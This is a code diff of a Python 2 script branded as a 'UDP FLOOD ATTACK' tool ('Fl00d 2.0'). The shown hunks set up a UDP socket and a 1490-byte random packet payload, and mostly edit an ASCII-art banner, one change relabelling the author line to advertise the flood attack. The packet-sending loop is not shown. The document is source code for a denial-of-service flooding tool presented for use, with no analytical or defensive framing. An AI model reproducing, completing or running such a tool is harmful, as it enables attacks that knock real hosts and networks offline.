@@ -22,8 +22,8 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 os.system("clear")
-print B+"
-print "
+print B+""
+print ""
 print "                                  _  "
 print "                                 / | "
 print "                                /  | "
@@ -37,7 +37,7 @@ print "       \________/   \_\   \_______/\_____________/  "
 print "              ________/   /                        "
 print "              \__________/ "+N
 print "   _____________________________________________________  "
-print "  || By: ZanAhmad ==> بريغدي أتڬير سنيفير أليت   == ||  "
+print "  ||    UDP FLOOD ATTACK ====>> By: ZhanAhmad  ||  "
 print "  ||__________________________________________________|| "
 print ""
 print "["+B+""+R+"#"+N+"] "+B+""+R+"بريغادي اتڬير سنيفير أليت"+N+" Fl00d 2.0 - "+B+""+R+"BASE"+N
